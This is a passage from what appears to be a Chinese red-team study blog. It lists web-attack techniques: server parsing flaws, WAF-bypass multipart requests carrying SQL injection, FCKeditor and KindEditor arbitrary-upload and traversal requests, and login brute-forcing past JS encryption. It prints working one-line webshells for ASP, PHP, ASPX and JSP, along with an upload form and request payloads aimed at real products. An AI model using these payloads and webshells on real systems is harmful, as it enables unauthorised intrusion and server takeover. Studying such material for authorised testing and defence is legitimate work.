<span class="hljs-number">7</span>）重命名</code></pre><p><strong>脚本后缀</strong></p><pre><code class="hljs awk">Php<span class="hljs-regexp">/php3/</span>php<span class="hljs-regexp">/php5/</span>php6<span class="hljs-regexp">/pht/</span>phpt/phtml 
asp<span class="hljs-regexp">/cer/</span>asa<span class="hljs-regexp">/cdx/</span>aspx<span class="hljs-regexp">/ashx/</span>ascx/asax 
jsp<span class="hljs-regexp">/jspx/i</span>spf</code></pre><p><strong>解析漏洞</strong></p><p>服务器特性:<br>1.会将Request中的不能编码部分的%去掉<br>2.Request中如果有unicode部分会将其进行解码</p><p><strong>IIS</strong></p><p>lIS6.0两个解析缺陷：目录名包含<code>.asp</code>、<code>.asa</code>、<code>.cer</code>的话，则该目录下的所有文件都将按照asp解析</p><p>例如:</p><p><code>/abc.asp/1.jpg</code> 会当做<code>/abc.asp</code> 进行解析<br><code>/abc.php/1.jpg</code> 会当做 <code>/abc.php</code> 进行解析</p><p><strong>Apache1.X 2.X解析漏洞</strong></p><p>Apache在以上版本中，解析文件名的方式是从后向前识别扩展名，直到遇见Apache可识别的扩展名为止</p><p><strong>Nginx</strong></p><p>以下Nginx容器的版本下，上传一个在waf白名单之内扩展名的文件shell. jpg，然后以shell.j pg.php进行请求</p><pre><code class="hljs markdown">• Nginx 0.5.<span class="hljs-emphasis">*</span>
<span class="hljs-emphasis">• Nginx 0.6.*</span>
• Nginx 0.7 &lt;= 0.7.65
• Nginx 0.8 &lt;= 0.8.37</code></pre><p>以上Nginx容器器的版本下，上传⼀个在waf白名单之内扩展名的文件shell.jpg，然后以shell.jpg%20.php进行请求</p><pre><code class="hljs plain">• Nginx 0.8.41 – 1.5.6：</code></pre><p>以上Nginx容器的版本下，上传一个在waf白名单之内扩展名的文件shell.jpg，然后以shell.jpg%20.php进行请求</p><p><strong>PHP CGI 解析漏洞</strong></p><pre><code class="hljs apache"><span class="hljs-attribute">IIS</span> <span class="hljs-number">7</span>.<span class="hljs-number">0</span>/<span class="hljs-number">7</span>.<span class="hljs-number">5</span>
<span class="hljs-attribute">Nginx</span> &lt; <span class="hljs-number">0</span>.<span class="hljs-number">8</span>.<span class="hljs-number">3</span></code></pre><p>以上的容器版本中默认php配置文件cgi.fix_pathinfo=1时，上传一个存在于白名单的扩展名文件shell.jpg，在请求时以shell.jpg/shell.php请求，会将shell.jpg以php来解析</p><pre><code class="hljs awk">https:<span class="hljs-regexp">//</span>xz.aliyun.com<span class="hljs-regexp">/t/</span><span class="hljs-number">337</span></code></pre><p><strong>系统特性：利用NTFS ADS特性</strong></p><p>ADS是NTFS磁盘格式的一个特性，用于NTFS交换数据流。在上传文件时，如果waf对请求正文的filename匹配不当的话可能会导致绕过</p><pre><code class="hljs stata"><span class="hljs-keyword">test</span>.asp.
<span class="hljs-keyword">test</span>.asp(空格)
<span class="hljs-keyword">test</span>.php:1.jpg
<span class="hljs-keyword">test</span>.php: <span class="hljs-variable">$DATA</span>
<span class="hljs-keyword">test</span>.php_</code></pre><p><img src="https://gitee.com/sec-pengyy/sec-pengyy/raw/master/images/%E7%BA%A2%E9%98%9F%E6%94%BB%E9%98%B2/20201217_%E7%BA%A2%E9%98%9F%E6%94%BB%E9%98%B2%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%89%93%E7%82%B9%E8%BF%9B%E5%86%85%E7%BD%91/08.png" srcset="/img/loading.gif" alt="系统特性"><br>参考文章：</p><ul><li><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/1189">https://xz.aliyun.com/t/1189</a></li></ul><hr><p><strong>协议解析不一致，绕过waf（注入跨站也可尝试）</strong></p><p>因为这种不仅仅存在于上传之处，注入跨站也可尝试</p><p><strong>垃圾数据</strong></p><pre><code class="hljs php">-------------WebkitFormBoundaryFADasdasdasDdasd
Content-Disposition: form-data; name=<span class="hljs-string">&quot;file&quot;</span>, filename=<span class="hljs-string">&#x27;abc.php&#x27;</span>;aaaaaaaaaaaaaaaa 
Content-Type: application/octet-stream；

<span class="hljs-meta">&lt;?php</span> phpinfo(); <span class="hljs-meta">?&gt;</span>
-------------WebkitFormBoundaryFADasdasdasDdasd</code></pre><hr><p><strong>文件类型绕过/Header 头类型</strong></p><p>修改文件类型绕过<code>/Header</code>头的<code>Content-Type</code>，多次尝试:</p><pre><code class="hljs fortran">Content-<span class="hljs-keyword">Type</span>：application/x-www-<span class="hljs-keyword">form</span>-urlencoded；
Content-<span class="hljs-keyword">Type</span>：multipart/<span class="hljs-keyword">form</span>-<span class="hljs-keyword">data</span>； 
Content-<span class="hljs-keyword">Type</span>：application/octet-stream；</code></pre><p><strong>文件名解析兼容性</strong></p><p>利用<code>filename</code>兼容性，多次修改常识<code>Content-Disposition</code>，多次尝试:</p><pre><code class="hljs routeros">Content-Disposition：form-data; <span class="hljs-attribute">name</span>=<span class="hljs-string">&quot;file&quot;</span>; <span class="hljs-attribute">filename</span>=bc.php
Content-Disposition：form-data; <span class="hljs-attribute">name</span>=<span class="hljs-string">&quot;file&quot;</span>; <span class="hljs-attribute">filename</span>=<span class="hljs-string">&quot;bc.php</span>
<span class="hljs-string">Content-Disposition：form-data; name=&quot;</span>file&quot;; <span class="hljs-attribute">filename</span>=<span class="hljs-string">&#x27;bc.php&#x27;</span></code></pre><p><strong>未解析所有文件</strong></p><p><code>multipart协议</code>中，一个POST请求可以同时上传多个文件。如图，许多WAF只检查第一个上传文件，没有检查上传的所有文件，而实际后端容器会解析所有上传的文件名，攻击者只需把paylaod放在后面的文件PART，即可绕过</p><pre><code class="hljs awk">https:<span class="hljs-regexp">//</span>blog.csdn.net<span class="hljs-regexp">/qq_32393893/</span>article<span class="hljs-regexp">/details/</span><span class="hljs-number">81625047</span></code></pre><p><strong>不规则Content-Disposition文件名覆盖</strong></p><pre><code class="hljs http">-------------WebkitFormBoundaryFADasdasdasDdasd
content-Dispositiona：form-data; name=&quot;file&quot;; filename=&#x27;abc.jpg&#x27; 
Content-Disposition：form-data; name=&quot;file&quot;; filename=abc.php&#x27;
<span class="hljs-attribute">Content-Type</span>: application/octet-stream; 

&lt;?php phpinfo(); ?&gt;
-------------WebkitFormBoundaryFADasdasdasDdasd</code></pre><ul><li><a target="_blank" rel="noopener" href="https://weibo.com/ttarticle/p/show?id=2309404007261092631700">https://weibo.com/ttarticle/p/show?id=2309404007261092631700</a></li></ul><p>文章讲解了Content-Disposition各种不规则绕过方法</p><hr><p><strong>boundary 绕过</strong></p><p>boundary边界不一致(Win2k3 + llS6.0 + ASP)</p><pre><code class="hljs llvm"><span class="hljs-number">1</span>）<span class="hljs-variable">%u</span>特性: iis支持对unicode的解析，如:payload为[s<span class="hljs-variable">%u006c</span><span class="hljs-variable">%u0006ect</span>]<span class="hljs-punctuation">,</span>解析出来后则是[<span class="hljs-keyword">select</span>]
     <span class="hljs-variable">%u0061nd</span> <span class="hljs-number">1</span><span class="hljs-operator">=</span><span class="hljs-number">1</span>
    另类<span class="hljs-variable">%u</span>特性: unicode在iis解析之后会被转换成multibyte，但是转换的过程中可能出现:多个widechar可能会转换为同一个字符。
    如：<span class="hljs-keyword">select</span>中的e对应的unicode为<span class="hljs-variable">%u0065</span>，但是<span class="hljs-variable">%u00f0</span>同样会被转换成为e s<span class="hljs-variable">%u00f0lect</span>
    iis+asp
    
<span class="hljs-number">2</span>）%特性: union selec<span class="hljs-variable">%t</span> user fr<span class="hljs-variable">%om</span> dd #iis+asp asp+iis环境下会忽略掉百分号，如：payload为[sele<span class="hljs-variable">%ct</span>]<span class="hljs-punctuation">,</span> 解析出来后则是[<span class="hljs-keyword">select</span>]
    
<span class="hljs-number">3</span>）asp/asp.net在解析请求的时候，允许Content-Type: application/<span class="hljs-keyword">x</span>-www-form-urlencoded的数据提交方式<span class="hljs-keyword">select</span><span class="hljs-variable">%201</span><span class="hljs-variable">%20</span>from<span class="hljs-variable">%20</span>user
    
    asp/asp.net request解析:
<span class="hljs-number">4</span>）在asp和asp.net中获取用户的提交的参数一般使用request包，当使用request(‘id’)的形式获取包的时候，会出现GET，POST分不清的情况，譬如可以构造一个请求包，METHOD为GET，但是包中还带有POST的内容和POST的content-<span class="hljs-keyword">type</span><span class="hljs-punctuation">,</span> 换一种理解方式也就是将原本的post数据包的method改成GET<span class="hljs-punctuation">,</span>如果使用request(‘id’)方式获取数据，仍会获取到post的内容</code></pre><p><strong>php+apache畸形的boundary</strong></p><p>php在解析multipart data的时候有自己的特性，对于boundary的识别，只取了逗号前面的内容，例如我们设置的boundary为—-aaaa,123456，php解析的时候只识别了—-aaaa,后面的内容均没有识别。然而其他的如WAF在做解析的时候，有可能获取的是整个字符串，此时可能就会出现BYPASS</p><pre><code class="hljs vhdl">Content-<span class="hljs-keyword">Type</span>: multipart/form-data; boundary=<span class="hljs-comment">------,xxxx</span>
    Content-Length: <span class="hljs-number">191</span>

    <span class="hljs-comment">------,xxxx</span>
    Content-Disposition: form-data; name=<span class="hljs-string">&quot;img&quot;</span>; filename=<span class="hljs-string">&quot;img.gif&quot;</span>

    GIF89a
    <span class="hljs-comment">------</span>
    Content-Disposition: form-data; name=<span class="hljs-string">&quot;id&quot;</span>

    <span class="hljs-number">1</span>&#x27; union <span class="hljs-keyword">select</span> <span class="hljs-keyword">null</span>,<span class="hljs-keyword">null</span>,flag,<span class="hljs-keyword">null</span> from flag limit <span class="hljs-number">1</span> offset <span class="hljs-number">1</span><span class="hljs-comment">-- -</span>
    <span class="hljs-comment">--------</span>
    <span class="hljs-comment">------,xxxx--</span>
<span class="hljs-number">12345678910111213</span></code></pre><p><strong>畸形method(header头中)</strong></p><p>某些apache版本在做GET请求的时候，无论method为何值均会取出GET的内容。如请求的method名为DOTA，依然会返回GET方法的值，即,可以任意替换GET方法为其它值，但仍能有效工作，但如果waf严格按照GET方法取值，则取不到任何内容</p><p>参考文章：</p><pre><code class="hljs awk">https:<span class="hljs-regexp">//</span>xz.aliyun.com<span class="hljs-regexp">/t/</span><span class="hljs-number">2418</span></code></pre><p>…….</p><p>等等骚姿势，后续慢慢添加</p><hr><h3 id="登录口JS前端加密绕过"><a href="#登录口JS前端加密绕过" class="headerlink" title="登录口JS前端加密绕过"></a>登录口JS前端加密绕过</h3><h4 id="概述"><a href="#概述" class="headerlink" title="概述"></a><strong>概述</strong></h4><p>渗透测试过程中遇到web登录的时候，现在很多场景账号密码都是经过js加密之后再请求发送（通过抓包可以看到加密信息）如图一burp抓到的包,request的post的登录包，很明显可以看到password参数的值是经过前端加密之后再进行传输的，遇到这种情况,普通发包的爆破脚本就很难爆破成功。鉴于这种情况,这边分析四种方式进行绕过加密爆破</p><p><img src="https://gitee.com/sec-pengyy/sec-pengyy/raw/master/images/%E7%BA%A2%E9%98%9F%E6%94%BB%E9%98%B2/20201217_%E7%BA%A2%E9%98%9F%E6%94%BB%E9%98%B2%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%89%93%E7%82%B9%E8%BF%9B%E5%86%85%E7%BD%91/09.png" srcset="/img/loading.gif" alt="参数值被加密"></p><h4 id="参考文章："><a href="#参考文章：" class="headerlink" title="参考文章："></a><strong>参考文章：</strong></h4><p>大概能分为以下四种方法</p><ul><li><a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/web/127888.html">https://www.freebuf.com/articles/web/127888.html</a></li></ul><h4 id="简述"><a href="#简述" class="headerlink" title="简述:"></a><strong>简述:</strong></h4><p>1）既然是前端s加密，代码我们都能看得到，我们搭个服务器，每次发包前，把要发送的加密参数用服务器加密一遍，我们再把加密后的参数发送过去，这样相当于本地还原了加密过程</p><p>2）利用selenium webdriver等完全模拟人工输入，字典也可以自定义，不过需要自己写脚本而已,这种方法比较万能</p><p>3）这种方法适合有js功底的同学，首先把他的js加密过程跟方法看懂，然后本地简化或者用其他语言模拟他的加密过程，再自己写脚本去跑，或者生成加密后的字典直接burp去跑即可</p><p>4）前人栽树，后人乘凉，cony1老哥为了方便后辈，写了一款burp插件， <code>https://github.com/c0ny1/jsENcrypter</code>，名为jsEncrypter，简单来说就是把1，3点结合了一下，用插件方便地跑起来</p><h4 id="jsEncrypter安装与本地测试"><a href="#jsEncrypter安装与本地测试" class="headerlink" title="jsEncrypter安装与本地测试"></a>jsEncrypter安装与本地测试</h4><p>这里重点介绍第四种方法</p><p>1）首先得安装 maven，mac下直接 brew install maven<br>安装连接：</p><ul><li><a target="_blank" rel="noopener" href="https://www.runoob.com/maven/maven-setup.html">https://www.runoob.com/maven/maven-setup.html</a></li></ul><p>按照文档三种系统都有安装方法</p><p>2）安装好maven后，把jsEncrypter git clone回来或者下载回来解压缩，然后在他的文件夹下，打开cmd窗口，然后运行mvn package，就可以把插件编译成型，编译好后会多出一个target文件夹<br>命令：<code>mvn package</code></p><p>这里不演示下去了…详细的查看文章…</p><ul><li><a target="_blank" rel="noopener" href="https://fucker-shamo.github.io/2019/08/04/%E7%99%BB%E9%99%86%E5%8F%A3js%E5%89%8D%E7%AB%AF%E5%8A%A0%E5%AF%86%E7%BB%95%E8%BF%87/">https://fucker-shamo.github.io/2019/08/04/登陆口js前端加密绕过/</a></li></ul><p>中间复现会遇到的一些问题：<br>安装phantomJS环境变量参考：<a target="_blank" rel="noopener" href="https://blog.csdn.net/xc_zhou/article/details/80700640">https://blog.csdn.net/xc_zhou/article/details/80700640</a></p><p>参考链接：</p><ul><li><a target="_blank" rel="noopener" href="http://gv7.me/articles/2018/fast-locate-the-front-end-encryption-method/">http://gv7.me/articles/2018/fast-locate-the-front-end-encryption-method/</a></li><li><a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/web/184455.html">https://www.freebuf.com/articles/web/184455.html</a></li><li><a target="_blank" rel="noopener" href="https://bbs.ichunqiu.com/thread-42457-1-3.html">https://bbs.ichunqiu.com/thread-42457-1-3.html</a></li><li><a target="_blank" rel="noopener" href="http://gv7.me/articles/2017/jsEncrypter/">http://gv7.me/articles/2017/jsEncrypter/</a></li><li><a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/web/127888.html">https://www.freebuf.com/articles/web/127888.html</a></li><li><a target="_blank" rel="noopener" href="https://www.cnblogs.com/xiaozi/p/9158988.html">https://www.cnblogs.com/xiaozi/p/9158988.html</a></li></ul><hr><h3 id="XMLDecoder-标签、POC"><a href="#XMLDecoder-标签、POC" class="headerlink" title="XMLDecoder 标签、POC"></a>XMLDecoder 标签、POC</h3><p><strong>标签类型：</strong><br>1）java<br>2）array<br>3）class<br>4）object<br>5）void<br>6）new<br>7）field<br>8）method<br>9）property<br>10）byte<br>11）其余数据类型</p><p><strong>XML的基本语法</strong><br><strong>XML简单利用</strong></p><p>详细文章：</p><ul><li><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/7944">https://xz.aliyun.com/t/7944</a></li></ul><p>该文章全面的介绍了XMLDecoder遇到的基础知识…了解后我们开始看下面的CVE解析文章</p><ul><li><a target="_blank" rel="noopener" href="http://xxlegend.com/tags/XMLDecoder/">http://xxlegend.com/tags/XMLDecoder/</a> –CVE-2019-2725、Weblogic XMLDecoder RCE分析</li><li><a target="_blank" rel="noopener" href="https://payloads.info/2020/07/01/Java%E5%AE%89%E5%85%A8-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%AF%87-XMLDecoder%E5%88%B0Weblogic%E5%87%A0%E4%B8%AA%E8%A1%A5%E4%B8%81%E7%9A%84%E7%BB%95%E8%BF%87%E5%88%86%E6%9E%90/">https://payloads.info/2020/07/01/Java安全-反序列化篇-XMLDecoder到Weblogic几个补丁的绕过分析/</a></li></ul><p>文章非常详细的POC</p><hr><h3 id="phpMyAdmin去getshell"><a href="#phpMyAdmin去getshell" class="headerlink" title="phpMyAdmin去getshell"></a>phpMyAdmin去getshell</h3><p><strong>前言</strong></p><p>在学习sql语句之前，拿到phpmyadmin弱口令登录到后台却不知道怎么利用，学习之后却有了新的想法利用phpMyadmin getshello接下去来验证自己的猜想</p><p><strong>phpMyAdmin的简介</strong><br>phpMyAdmin 是一个以PHP为基础，以Web-Base方式架构在网站主机上的MySQL的数据库管理工具，让管理者可用Web接口管理MySQL数据库。借由此Web接口可以成为一个简易方式输入繁杂SQL语法的较佳途径，尤其要处理大量资料的汇入及汇出更为方便。其中一个更大的优势在于由于phpMyAdmin跟其他PHP程式一样在网页服务器上执行，但是您可以在任何地方使用这些程式产生的HTML页面，也就是于远端管理MySQL数据库，方便的建立、修改、删除数据库及资料表。也可借由phpMyAdmin建立常用的php语法，方便编写网页时所需要的sql语法正确性。</p><p>详细文章：</p><ul><li><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/3283">https://xz.aliyun.com/t/3283</a></li><li><a target="_blank" rel="noopener" href="https://my.oschina.net/u/4196756/blog/4408564">https://my.oschina.net/u/4196756/blog/4408564</a> –近期最新文章复现讲解</li><li><a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/25957366">https://zhuanlan.zhihu.com/p/25957366</a></li></ul><hr><h3 id="攻击JWT的一些方法"><a href="#攻击JWT的一些方法" class="headerlink" title="攻击JWT的一些方法"></a>攻击JWT的一些方法</h3><p>详细文章：</p><pre><code class="hljs awk">https:<span class="hljs-regexp">//</span>xz.aliyun.com<span class="hljs-regexp">/t/</span><span class="hljs-number">6776</span></code></pre><p>该文章中REF有详细链接，以及针对JWT的爆破密匙工具c-jwt-cracker也有详细链接介绍等</p><hr><h3 id="上传漏洞"><a href="#上传漏洞" class="headerlink" title="上传漏洞"></a>上传漏洞</h3><h4 id="上传技巧"><a href="#上传技巧" class="headerlink" title="上传技巧"></a>上传技巧</h4><pre><code class="hljs tap">大小写混淆
%00截断 
上传.htaccess分布式部署文件 
图片文件头：47<span class="hljs-number"> 49 </span>46<span class="hljs-number"> 38 </span>39<span class="hljs-number"> 61 </span>(gif)、FF D8 FF E0<span class="hljs-number"> 00 </span>10 4A<span class="hljs-number"> 46 </span>49<span class="hljs-number"> 46 </span>(jpg) 、89<span class="hljs-number"> 50 </span>4E<span class="hljs-number"> 47 </span>(png) 
其他解析格式：cer、asa、php4、php3、php5、phtml、jspx
修改（Content-type）MIME 
目录回溯符 filename=&quot;../backdoor. php&quot;</code></pre><hr><h4 id="编辑器漏洞"><a href="#编辑器漏洞" class="headerlink" title="编辑器漏洞"></a><strong>编辑器漏洞</strong></h4><h5 id="百度编辑器-Ueditor"><a href="#百度编辑器-Ueditor" class="headerlink" title="百度编辑器 Ueditor"></a><strong>百度编辑器 Ueditor</strong></h5><pre><code class="hljs routeros">controller.ashx?<span class="hljs-attribute">action</span>=catchimage</code></pre><h5 id="FCKeditor"><a href="#FCKeditor" class="headerlink" title="FCKeditor"></a><strong>FCKeditor</strong></h5><p><strong>查看版本</strong></p><pre><code class="hljs awk"><span class="hljs-regexp">/fckeditor/</span>editor<span class="hljs-regexp">/dialog/</span>fck_about.html
<span class="hljs-regexp">/fckeditor/</span>_Whatsnew.html</code></pre><p><strong>上传页面</strong></p><pre><code class="hljs gradle">FCKeditor<span class="hljs-regexp">/editor/</span>filemanager<span class="hljs-regexp">/browser/</span><span class="hljs-keyword">default</span><span class="hljs-regexp">/connectors/</span>asp<span class="hljs-regexp">/connector.asp?Command=GetFoldersAndFiles&amp;Type=Image&amp;CurrentFolder=/</span>

FCKeditor<span class="hljs-regexp">/editor/</span>filemanager<span class="hljs-regexp">/browser/</span><span class="hljs-keyword">default</span><span class="hljs-regexp">/browser.html?type=Image&amp;connector=connectors/</span>asp/connector.asp

FCKeditor<span class="hljs-regexp">/editor/</span>filemanager<span class="hljs-regexp">/browser/</span><span class="hljs-keyword">default</span><span class="hljs-regexp">/browser.html?Type=Image&amp;Connector=http:/</span><span class="hljs-regexp">/www.site.com%2Ffckeditor%2Feditor%2Ffilemanager%2Fconnectors%2Fphp%2Fconnector.php (ver:2.6.3 测试通过)</span></code></pre><pre><code class="hljs gradle">JSP 版：

FCKeditor<span class="hljs-regexp">/editor/</span>filemanager<span class="hljs-regexp">/browser/</span><span class="hljs-keyword">default</span><span class="hljs-regexp">/browser.html?Type=Image&amp;Connector=connectors/</span>jsp/connector.jsp

注意红色部分修改为FCKeditor 实际使用的脚本语言，蓝色部分可以自定义文

件夹名称也可以利用../..目录遍历，紫色部分为实际网站地址。</code></pre><pre><code class="hljs gradle">FCKeditor 中test 文件的上传地址

FCKeditor<span class="hljs-regexp">/editor/</span>filemanager<span class="hljs-regexp">/browser/</span><span class="hljs-keyword">default</span><span class="hljs-regexp">/connectors/</span>test.html
FCKeditor<span class="hljs-regexp">/editor/</span>filemanager<span class="hljs-regexp">/upload/</span>test.html
FCKeditor<span class="hljs-regexp">/editor/</span>filemanager<span class="hljs-regexp">/connectors/</span>test.html
FCKeditor<span class="hljs-regexp">/editor/</span>filemanager<span class="hljs-regexp">/connectors/u</span>ploadtest.html</code></pre><pre><code class="hljs awk">一般很多站点都已删除_samples 目录，可以试试。

FCKeditor<span class="hljs-regexp">/editor/</span>fckeditor.html 不可以上传文件，可以点击上传图片按钮再选择浏览服务器即可跳转至可上传文件页。</code></pre><p>参考文章：</p><ul><li><a target="_blank" rel="noopener" href="https://cloud.tencent.com/developer/news/210677">https://cloud.tencent.com/developer/news/210677</a></li></ul><p><strong>上传的思路</strong></p><p><strong>Version 2.2 版本</strong></p><p>Apache+linux 环境下在上传文件后面加个.突破！测试通过</p><p><strong>Version &lt;=2.4.2 For php</strong></p><p>在处理PHP 上传的地方并未对Media 类型进行上传文件类型的控制，导致用户上传任意文件！将以下保存为html文件，修改action地址</p><pre><code class="hljs stata">&lt;<span class="hljs-keyword">form</span> id=<span class="hljs-string">&quot;frmUpload&quot;</span> enctype=<span class="hljs-string">&quot;multipart/form-data&quot;</span>
action=<span class="hljs-string">&quot;http://www.site.com/FCKeditor/editor/filemanager/upload/php/upload.php?Type=Media&quot;</span> 

method=<span class="hljs-string">&quot;post&quot;</span>&gt;Upload a new <span class="hljs-keyword">file</span>:&lt;<span class="hljs-keyword">br</span>&gt;
&lt;<span class="hljs-keyword">input</span> <span class="hljs-keyword">type</span>=<span class="hljs-string">&quot;file&quot;</span> name=<span class="hljs-string">&quot;NewFile&quot;</span> size=<span class="hljs-string">&quot;50&quot;</span>&gt;&lt;<span class="hljs-keyword">br</span>&gt;
&lt;<span class="hljs-keyword">input</span> id=<span class="hljs-string">&quot;btnUpload&quot;</span> <span class="hljs-keyword">type</span>=<span class="hljs-string">&quot;submit&quot;</span> value=<span class="hljs-string">&quot;Upload&quot;</span>&gt;
&lt;/<span class="hljs-keyword">form</span>&gt;</code></pre><p><strong>FCKeditor 文件上传.变_下划线的绕过方法</strong></p><p>很多时候上传的文件例如：shell.php.rar 或shell.php;.jpg 会变为shell_php;.jpg 这是新版FCK 的变化</p><p>提交shell.php+空格绕过，不过空格只支持win 系统 *nix 是不支持的[shell.php 和shell.php+空格是2 个不同的文件 未测试</p><p>继续上传同名文件可变为shell.php;(1).jpg 也可以新建一个文件夹，只检测了第一级的目录，如果跳到二级目录就不受限制</p><p><strong>Version 2.4.1 测试通过</strong></p><p>修改CurrentFolder 参数使用 …/…/ 来进入不同的目录</p><pre><code class="hljs gradle"><span class="hljs-regexp">/browser/</span><span class="hljs-keyword">default</span><span class="hljs-regexp">/connectors/</span>aspx<span class="hljs-regexp">/connector.aspx?Command=CreateFolder&amp;Type=Image&amp;CurrentFolder=../</span>../..%<span class="hljs-number">2</span>F&amp;NewFolderName=shell.asp</code></pre><p><strong>根据返回的XML 信息可以查看网站所有的目录</strong></p><pre><code class="hljs gradle">FCKeditor<span class="hljs-regexp">/editor/</span>filemanager<span class="hljs-regexp">/browser/</span><span class="hljs-keyword">default</span><span class="hljs-regexp">/connectors/</span>aspx/connector.aspx?Command=GetFoldersAndFiles&amp;Type=Image&amp;CurrentFolder=%<span class="hljs-number">2</span>F</code></pre><p><strong>也可以直接浏览盘符</strong>：<br><strong>JSP 版本</strong>：</p><pre><code class="hljs gradle">FCKeditor<span class="hljs-regexp">/editor/</span>filemanager<span class="hljs-regexp">/browser/</span><span class="hljs-keyword">default</span><span class="hljs-regexp">/connectors/</span>jsp/connector?Command=GetFoldersAndFiles&amp;Type=&amp;CurrentFolder=%<span class="hljs-number">2</span>F</code></pre><p><strong>Fckeditor 2.0 &lt;= 2.2</strong></p><p>允许上传asa、cer、php2、php4、inc、pwml、pht 后缀的文件上传后它保存的文件直接用的<code>$sFilePath = $sServerDir . $sFileName</code>，而没有使用<code>$sExtension</code>为后缀.直接导致在windows下在上传文件后面加个.来突破（这里点点很重要）</p><p>而在apache 下，因为”Apache 文件名解析缺陷漏洞”也可以利用之，另建议其他上传漏洞中定义TYPE 变量时使用File 类别来上传文件,根据FCKeditor 的代码，其限制最为狭隘</p><p>在上传时遇见可直接上传脚本文件固然很好，但有些版本可能无法直接上传可以利用在文件名后面加.点或空格绕过，也可以利用iis6 解析漏洞建立xxx.asp文件夹或者上传<code>xx.asp;.jpg</code></p><p>参考文章：</p><ul><li><a target="_blank" rel="noopener" href="https://www.cnblogs.com/zpchcbd/p/11745119.html">https://www.cnblogs.com/zpchcbd/p/11745119.html</a></li></ul><hr><h5 id="KindEditor"><a href="#KindEditor" class="headerlink" title="KindEditor"></a>KindEditor</h5><p><strong>上传页面</strong></p><pre><code class="hljs gradle">kindeditor<span class="hljs-regexp">/asp/u</span>pload_json.asp?dir=<span class="hljs-keyword">file</span>
kindeditor<span class="hljs-regexp">/asp.net/u</span>pload_json.ashx?dir=<span class="hljs-keyword">file</span>
kindeditor<span class="hljs-regexp">/jsp/u</span>pload_json.jsp?dir=<span class="hljs-keyword">file</span>
kindeditor<span class="hljs-regexp">/php/u</span>pload_json.php?dir=<span class="hljs-keyword">file</span></code></pre><p><strong>上传思路</strong><br>kindeditor&lt;=4.1.5</p><pre><code class="hljs awk">curl -F<span class="hljs-string">&quot;imgFile=@1.html&quot;</span>http:<span class="hljs-regexp">//</span><span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span><span class="hljs-regexp">/test/</span>kindeditor<span class="hljs-regexp">/php/u</span>pload_json.php?dir=file</code></pre><p>参考文章：</p><ul><li><a target="_blank" rel="noopener" href="https://www.sinesafe.com/article/20190510/Kindeditor.html">https://www.sinesafe.com/article/20190510/Kindeditor.html</a></li><li><a target="_blank" rel="noopener" href="https://www.freebuf.com/column/202148.html">https://www.freebuf.com/column/202148.html</a> –上传思路</li></ul><hr><h4 id="上传漏洞总结"><a href="#上传漏洞总结" class="headerlink" title="上传漏洞总结"></a>上传漏洞总结</h4><h5 id="概要说明"><a href="#概要说明" class="headerlink" title="概要说明"></a>概要说明</h5><p>文件上传漏洞可以说是日常渗透测试用得最多的一个漏洞，因为用它获得服务器权限最快最直接</p><p><strong>Asp一句话</strong> ：</p><pre><code class="hljs asp">&lt;%eval request(“kkk”)%&gt; 	kkk</code></pre><p><strong>Php一句话：</strong></p><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-number">666</span>]);<span class="hljs-meta">?&gt;</span> 	<span class="hljs-number">666</span></code></pre><p><strong>Aspx一句话:</strong></p><pre><code class="hljs aspx">&lt;%@ Page Language&#x3D;&quot;Jscript&quot;%&gt;&lt;%eval(Request.Item[&quot;111&quot;],&quot;unsafe&quot;);%&gt;</code></pre><p><strong>Jsp一句话：</strong></p><pre><code class="hljs jsp">&lt;%
<span class="hljs-keyword">if</span>(request.getParameter(<span class="hljs-string">&quot;f&quot;</span>)!=<span class="hljs-keyword">null</span>)(<span class="hljs-keyword">new</span> java.io.FileOutputStream(application.getRealPath(<span class="hljs-string">&quot;\\&quot;</span>)+request.getParameter(<span class="hljs-string">&quot;f&quot;</span>))).write(request.getParameter(<span class="hljs-string">&quot;t&quot;</span>).getBytes());
%&gt;</code></pre><p>参考一句话：</p><ul><li><a target="_blank" rel="noopener" href="https://my.oschina.net/u/4373914/blog/3467075">https://my.oschina.net/u/4373914/blog/3467075</a></li></ul><hr><h5 id="服务端的上传验证"><a href="#服务端的上传验证" class="headerlink" title="服务端的上传验证"></a>服务端的上传验证</h5><p><strong>1）白名单验证定义允许上传的后缀类型,除此所有后缀都不允许</strong></p><p><strong>2）黑名单验证</strong></p><p>定义不允许上传的后缀类型，除此之类其他后缀都可以上传</p><p>定义不允许上传的后缀：</p><pre><code class="hljs plain">asp、aspx、asa、cer、cdx、ash</code></pre><p>【突破方法】</p><ol><li><p>未重命名可以配合解析漏洞(很少)</p></li><li><p>可以用cer达到绕过效果</p></li><li><p>如果未用转换函数强制转换后缀为小写(ASP)</p></li><li><p>特殊后缀达到效果可利用ashx来生成一句话</p></li><li><p>.htaccess来实现后缀引导。上传jpg可以解析成脚本，具体在内容定义</p></li></ol><p><strong>3）文件头验证</strong><br>文件内容开头加上<code>GIF89a</code><br><strong>4）文件类型验证</strong><br>例如可以把php的文件类型改成正常的图片类型</p><p><strong>5）文件后缀验证</strong></p><p>典型的白名单验证，指定上传后缀必须为jpg、JPG、jpeg、JPEG</p><p><strong>6）js前端验证</strong></p><p>Js在前端定义了允许上传的后缀类型</p><p>【突破方法】直接在前端修改或添加后缀，找不到就搜索图片后缀如jpg。或者直接抓包改。</p><p>……</p><p>等等，后续分开写</p><hr><h3 id="注入漏洞"><a href="#注入漏洞" class="headerlink" title="注入漏洞"></a>注入漏洞</h3><p>太多了，后续分开写。</p><hr><h3 id="文件读取漏洞"><a href="#文件读取漏洞" class="headerlink" title="文件读取漏洞"></a>文件读取漏洞</h3><ul><li><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/6594">https://xz.aliyun.com/t/6594</a></li></ul><h3 id="Pentesterlab-Xss"><a href="#Pentesterlab-Xss" class="headerlink" title="Pentesterlab Xss"></a>Pentesterlab 